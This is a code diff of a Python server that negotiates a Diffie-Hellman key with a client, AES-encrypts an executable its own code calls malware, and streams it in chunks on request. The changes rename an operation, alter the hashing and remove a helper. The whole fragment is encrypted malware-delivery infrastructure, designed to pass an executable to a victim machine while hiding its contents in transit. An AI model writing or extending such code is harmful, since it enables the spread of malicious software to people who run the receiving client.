@@ -69,20 +69,6 @@ def split_data_for_buffer(data, buffer_size):
     return [data[i:i + buffer_size] for i in range(0, len(data), buffer_size)]
 
 
-def string_to_byte_array(hex_str):
-    try:
-        num_chars = len(hex_str)
-        bytes = bytearray(num_chars // 2)
-        for i in range(0, num_chars, 2):
-            bytes[i // 2] = int(hex_str[i:i + 2], 16)
-            print("Byte written:", bytes[i // 2])
-
-        return bytes
-    except Exception as ex:
-        print("StringToByteArray error:", ex)
-        return None
-
-
 def prepare_malware_data(aes_key):
     original_data = fetch_malware()
     padded_data = pad_data(original_data)
@@ -90,10 +76,10 @@ def prepare_malware_data(aes_key):
     cipher = Cipher(algorithms.AES(aes_key), modes.CBC(IV))
     encryptor = cipher.encryptor()
 
-    hash_original_text = hashlib.sha256(original_data).hexdigest()
-
+    hash_original_text = hashlib.sha256(padded_data).hexdigest()
+    
     cipher_text = encryptor.update(padded_data) + encryptor.finalize()
-
+    
     split_data = split_data_for_buffer(cipher_text, MAX_BUFFER_SIZE)
 
     return split_data, hash_original_text, len(cipher_text)
@@ -132,6 +118,7 @@ def start_server():
                             "Gx_server": str(y)}
                 print("Sending params for key generation")
                 client_socket.sendall(bytes(json.dumps(response), encoding="utf-8"))
+                
             elif operation == "keyExchangeAns":
                 print(f"Received params to establish symmetric encryption key")
                 dh_key = calculate_dh_key(int(request["Gx_client"]), dh_secret, dh_prime)
@@ -143,7 +130,8 @@ def start_server():
 
                 aes_key = calculate_aes_key(dh_key_hex)
                 print(f"Computed AES key: {aes_key.hex()}")
-            elif operation == "ExeSend" and malware_requests < MAX_MALWARE_REQUESTS:
+                
+            elif operation == "exeSend" and malware_requests < MAX_MALWARE_REQUESTS:
                 malware_requests += 1
                 malware_data, malware_hash, malware_size = prepare_malware_data(aes_key)
 
@@ -160,6 +148,7 @@ def start_server():
                     progress.update(len(data))
 
                 print("Encrypted executable sent")
+                
             elif operation == "EndRequest" or malware_requests >= MAX_MALWARE_REQUESTS:
                 if malware_requests >= MAX_MALWARE_REQUESTS:
                     print("Maximum amount of malware requests exceeded")
